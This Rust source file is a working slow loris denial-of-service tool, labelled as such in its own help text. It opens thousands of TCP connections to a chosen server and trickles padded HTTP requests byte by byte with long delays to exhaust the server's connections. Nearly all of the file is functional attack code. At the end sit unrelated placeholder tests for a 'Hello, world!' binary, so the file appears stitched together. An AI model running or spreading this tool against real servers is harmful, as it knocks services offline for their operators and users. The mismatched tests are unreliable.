use std::io::Write;
use std::net::{IpAddr, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread::{sleep, spawn};
use std::time::Duration as StdDuration;

use chrono::Local;
use console::Term;
use ctrlc;
use indicatif::{MultiProgress, ProgressBar, ProgressDrawTarget, ProgressStyle};
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;

struct Args {
    host: String,
    ip: IpAddr,
    port: u16,
    max_connections: u64,
    timeout_min: u64,
    timeout_max: u64,
    body_length_min: usize,
    body_length_max: usize,

}

struct Attrs {
    total_requests: u64,
    total_responses: u64,
    total_response_time: u64,
    current_connections: u64,
    current_threads: u64,
}

impl Attrs {
    pub fn new() -> Self {
        Self {
            total_requests: 0,
            total_responses: 1, // is one to not divide by zero before the first request
            total_response_time: 0,
            current_connections: 0,
            current_threads: 0,
        }
    }
}

fn main() {
    // set the important application variables and states
    let args = Arc::new(parse_args());
    let attrs = Arc::new(Mutex::new(Attrs::new()));

    // create a progress bar
    // This progress bar show the user the currently sending connections in comparision to the maximum
    // amount of connections
    let progress_bars = MultiProgress::new();
    progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections)
        .with_style(ProgressStyle::default_bar()
            .template("Average response time: {msg} ms\n\nSending connections: {pos}/{len}\n{wide_bar}")));
    let success_bar = progress_bars.add(ProgressBar::new(100)
        .with_style(ProgressStyle::default_bar()
            .template("successful requests: {pos}%\n{wide_bar}")));

    // Hide the console cursor and clear the screen
    Term::stdout().hide_cursor().unwrap_or_else(|_| {});
    Term::stdout().clear_screen().unwrap_or_else(|_| println!("\n\n"));

    // change the Ctrl+C behaviour to just exit the process
    ctrlc::set_handler(|| std::process::exit(0))
        .expect("Could not change ctrl-c behaviour");

    // it's necessary to create a new thread so the progress-bars are displayed correctly
    spawn(move || {
        loop {
            let average_response_time;
            let successful_connects;
            let current_threads;
            let current_connections;
            {
                let attrs = attrs.lock().unwrap();
                average_response_time = (attrs.total_response_time / attrs.total_responses).to_string();
                successful_connects = ((attrs.total_responses as f64 / attrs.total_requests as f64) * 100.0) as u64;
                current_connections = attrs.current_connections;
                current_threads = attrs.current_threads;
            }

            // update the progress bar
            connection_bar.set_position(current_connections);
            connection_bar.set_message(&average_response_time);
            success_bar.set_position(successful_connects);

            // spawn a new thread if not enough connections exists
            if current_threads < args.max_connections {
                let args = Arc::clone(&args);
                let attrs = Arc::clone(&attrs);
                let port = args.port;

                {
                    let mut attrs = attrs.lock().unwrap();
                    attrs.current_threads += 1;
                    attrs.total_requests += 1;
                }

                spawn(move || {
                    new_socket(args, attrs, port);
                });
            }
        }
    });

    progress_bars.join().unwrap();
}

/// parses the arguments given to the application
fn parse_args() -> Args {
    use dns_lookup::{lookup_host, lookup_addr};
    use clap::{App, Arg};

    fn validate_range(string: &str) -> Result<(), String> {
        if let Ok(_) = parse_range(&string) { Ok(()) } else { Err("takes values in the form of: <time> | <start>..<end> | <start>..=<end>".to_string()) }
    }

    let matches = App::new("Slow Loris")
        .about("A slow loris attack implementation in Rust")
        .author(clap::crate_authors!())
        .version(clap::crate_version!())
        .arg(Arg::with_name("address")
            .help("The address of the server\nCan either be an ip or a domain")
            .takes_value(true)
            .required(true)
        )
        .arg(Arg::with_name("connections")
            .help("The amount of connections established")
            .short("c")
            .long("connections")
            .takes_value(true)
            .default_value("2000")
            .validator(|connections| {
                if let Ok(_) = connections.parse::<u64>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
            })
        )
        .arg(Arg::with_name("timeout")
            .help("specifies the timeout between each send byte in seconds\n\
            takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n")
            .short("t")
            .long("timeout")
            .takes_value(true)
            .default_value("5..10")
            .validator(|timeout| validate_range(&timeout))
        )
        .arg(Arg::with_name("body_length")
            .help("specifies the body length of the request each connection sends\n\
            takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n")
            .short("b")
            .long("body_length")
            .takes_value(true)
            .default_value("11000")
            .validator(|length| validate_range(&length))
        )
        .arg(Arg::with_name("port")
            .help("specifies the port to connect to")
            .short("p")
            .long("port")
            .takes_value(true)
            .default_value("443")
            .validator(|port| {
                if let Ok(_) = port.parse::<u16>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
            })
        )
        .get_matches();

    let host;
    let ip;
    let address = matches.value_of("address").unwrap();
    match address.parse::<IpAddr>() {
        Ok(parsed) => {
            host = lookup_addr(&parsed)
                .expect("Could not find hostname for given ip");
            ip = parsed;
        }
        Err(_) => {
            host = address.to_string();
            ip = match lookup_host(address) {
                Ok(ips) if ips.len() == 1 => ips[0],
                _ => panic!("Could not find ip for given domain")
            }
        }
    }
    let port = matches.value_of("port").unwrap().parse().unwrap();
    let max_connections = matches.value_of("connections").unwrap().parse().unwrap();
    let (timeout_min, timeout_max) = parse_range(matches.value_of("timeout").unwrap()).unwrap();
    let body_length = parse_range(matches.value_of("body_length").unwrap()).unwrap();
    let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);


    Args {
        host,
        ip,
        port,
        max_connections,
        timeout_min,
        timeout_max,
        body_length_min,
        body_length_max,
    }
}

/// takes a str and ties to parse it into a tuple of a start and an end value
/// returns (<start_inclusive>, <end_exclusive>)
fn parse_range(string: &str) -> Result<(u64, u64), ()> {
    use regex::Regex;

    let ports_regex = Regex::new(r"^((?P<start>\d+)\.\.(?P<inclusive>=)?(?P<end>\d+)|(?P<single>\d+))$").unwrap();

    match ports_regex.captures(string) {
        Some(captures) => {
            if captures.name("single").is_some() {
                let single = captures.name("single").unwrap().as_str();
                let single: u64 = single.parse().unwrap();
                Ok((single, single + 1))
            } else {
                let start = captures.name("start").unwrap().as_str();
                let start: u64 = start.parse().unwrap();

                let end = captures.name("end").unwrap().as_str();
                let end: u64 = end.parse().unwrap();

                let inclusive = captures.name("inclusive").is_some();

                if inclusive {
                    Ok((start, end + 1))
                } else {
                    Ok((start, end))
                }
            }
        }
        None => Err(())
    }
}

/// Tries to create a new TCPStream connection to the attacked server
/// If this succeeds a HTTP request is send byte by byte with a delay between
fn new_socket(args: Arc<Args>, attrs: Arc<Mutex<Attrs>>, port: u16) {
    let start = Local::now();

    let mut connection = match TcpStream::connect((args.ip, port)) {
        Ok(connection) => {
            let response_time = Local::now().signed_duration_since(start).num_milliseconds() as u64;

            let mut attrs = attrs.lock().unwrap();
            attrs.current_connections += 1;
            attrs.total_response_time += response_time;
            attrs.total_responses += 1;

            connection
        }
        Err(_) => return
    };

    let time_out = thread_rng().gen_range(args.timeout_min, args.timeout_max);
    let time_out = StdDuration::from_secs(time_out);

    let body_length = thread_rng().gen_range(args.body_length_min, args.body_length_max);

    let request = http_request(&args.host, body_length);

    for byte in request.as_bytes() {
        if let Err(_) = connection.write_all(&[*byte]) {
            let mut attrs = attrs.lock().unwrap();
            attrs.current_connections -= 1;
            attrs.current_threads -= 1;

            return;
        }
        sleep(time_out);
    }

    let mut attrs = attrs.lock().unwrap();
    attrs.current_connections -= 1;
    attrs.current_threads -= 1;
}

/// creates a http request from a http header and a http body
fn http_request(host: &str, body_length: usize) -> String {
    format!("{}{}", http_header(host, body_length), http_body(body_length))
}

/// creates a valid HTTP header with as much noise as possible
fn http_header(host: &str, content_length: usize) -> String {
    format!("\
    GET / HTTP/1.1\n\
    Host: {}\n\
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange; v=b3; q=0.9,*/*;q=0.8\n\
    Accept-Charset: utf-8\n\
    Accept-Encoding: gzip,deflate,br\n\
    Accept-Language: en-US,en;q=0.9,en-UK;q=0.8,en;q=0.7,fr;q=0.6;de-DE\n\
    Cache-Control: cache\n\
    Connection: keep-alive\n\
    Content-Length: {}\n\
    Content-Type: application/x-www-form-urlencoded\n\
    Date: {}\n\
    If-Match: \"737060cd8c284d8af7ad3082f209582d\"\n\
    If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\n\
    If-Unmodified-Since: {}\n\
    Max-Forwards: 1000\n\
    Pragma: cache\n\
    Range: bytes=0-10\n\
    TE: trailers, deflate\n\
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0\n\
    \n\
    ", host, content_length, Local::now().format("%a, %d %b %Y %T %Z"), Local::now())
}

/// creates a application/x-www-form-urlencoded encoded body
fn http_body(length: usize) -> String {
    const LINE_LENGTH: usize = 11;

    let lines = length / LINE_LENGTH;
    let rest = length % LINE_LENGTH;
    let mut string = String::new();

    for _ in 0..lines {
        let first: usize = thread_rng().gen_range(1, LINE_LENGTH - 1);
        let last = LINE_LENGTH - first - 1;

        string.push_str(&rand_string(first));
        string.push('=');
        string.push_str(&rand_string(last));
    }
    string.push_str(&rand_string(rest));

    string
}


/// creates a random string
fn rand_string(length: usize) -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .collect::<String>()
}

use std::process::Command;
use assert_cmd::prelude::*;
use predicates::prelude::*;

#[test]
fn test_app_no_arguments() -> Result<(), Box<dyn std::error::Error>> {
    let mut cmd = Command::cargo_bin("app")?; // Assuming your binary is named "app"

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("Hello, world!")); // Replace with your app's expected output

    Ok(())
}

#[test]
fn test_app_with_argument() -> Result<(), Box<dyn std::error::Error>> {
    let mut cmd = Command::cargo_bin("app")?;
    cmd.arg("test_argument");

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("Received argument: test_argument")); // Adjust based on your app's logic

    Ok(())
}

#[test]
fn test_app_exits_with_error() -> Result<(), Box<dyn std::error::Error>> {
    let mut cmd = Command::cargo_bin("app")?;
    cmd.arg("--invalid-option"); // Example of an argument that might cause an error

    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("error:")); // Adjust based on your app's error message

    Ok(())
}

